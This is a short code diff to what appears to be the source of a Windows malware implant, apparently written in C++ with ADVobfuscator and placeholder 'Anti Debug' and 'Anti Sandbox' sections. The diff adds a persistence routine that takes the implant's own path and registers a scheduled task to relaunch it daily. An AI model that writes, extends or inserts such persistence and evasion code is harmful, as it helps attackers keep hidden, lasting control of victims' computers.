@@ -20,6 +20,7 @@
 #include "command.h"
 #include "utils.h"
 #include "handlers.h"
+#include "schtask.h"
 
 using namespace std;
 using namespace andrivet::ADVobfuscator;
@@ -36,6 +37,10 @@ int main()
 	// Anti Debug
 
 	// Anti Sandbox
+
+	// Persistence
+	wchar_t *pSelfImplantPath =  GetImplantPath();
+	int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));
 
 	string privKey;
 	string pubKey;
